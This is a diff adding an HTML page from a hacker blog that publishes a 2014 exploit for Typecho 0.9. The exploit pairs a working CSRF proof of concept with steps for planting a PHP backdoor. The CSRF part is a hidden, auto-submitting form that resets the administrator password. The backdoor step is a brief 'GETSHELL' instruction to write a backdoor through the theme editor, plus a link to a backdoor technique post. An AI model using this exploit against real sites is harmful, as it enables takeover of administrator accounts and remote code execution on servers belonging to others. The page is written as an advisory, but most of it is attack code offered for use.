@@ -1,0 +1,77 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Typecho 0.9(13.12.12) CSRF修改管理员密码漏洞 - Hackersoul.com</title>
+  <meta name="keywords" content="HackerSoul,FF0000TEAM,Typecho漏洞">
+  <link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/hackersoul.css">
+  <link rel="shortcut icon" href="favicon.ico" type=image/x-icon>
+</head>
+
+<body>
+  <div class="header">
+    <img src="/img/hs_header.jpg" class="header-bg">
+  </div>
+  <div class="narrow-board">
+    <a class="logo-container" href="/" title="一个有情怀的黑客博客">
+      <img src="/img/hs_logo.png" class="logo">
+      <div class="slogan">Enjoy hacking, Enjoy life.</div>
+    </a>
+
+    <div class="post">
+      <pre>
+      <xmp>                           
+                  .::Typecho 0.9(13.12.12) CSRF修改管理员密码漏洞::.
+
+                    We enjoy hacking of life in day and night.
+
+                _______________________________________________
+				
+                  [+] HSID: FF000-HSDB-0002
+                  [+] Author: Evi1m0 <evi1m0.bat@gmail.com>
+                  [+] Team: FF0000 TEAM <http://www.ff0000.cc>
+                  [+] From: HackerSoul <http://www.hackersoul.com>
+                  [+] Create: 2014-06-22
+                _______________________________________________
+
+
+                                  -= Main =-
+
+[*] 1. Description
+    
+http://typecho/admin/profile.php page, Change password form CSRF vul.
+http://typecho/admin/themes.php, We can write the PHP Backdoor in this page.
+
+[*] 2. CSRF POC
+
+<div style="display: none;">
+<form action="http://typecho/index.php/action/users-profile" method="post" name="ff0000team" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="password" value="bug1024"/>
+<input type="hidden" name="confirm" value="bug1024" />
+<input name="do" type="hidden" value="password" />
+<button type="submit"></button>
+</form>
+</div>
+<script>
+setTimeout("document.ff0000team.submit()", 2000);
+</script>
+
+
+[*] 3. GETSHELL
+
+http://typecho/admin/theme-editor.php page, Write backdoor.
+Or, Write this: http://www.hackersoul.com/post/PHP中使用按位取反函数创建后门.html
+
+
+                                  -= END =-
+      </xmp>
+      </pre>
+    </div>
+
+    <div class="footer">
+	<span class="copy">&copy;&nbsp;</span>2014 FF0000 TeAm. <a href="/about.html" class="red-link">About Us</a>
+    </div>
+  </div>
+</body>
+</html>
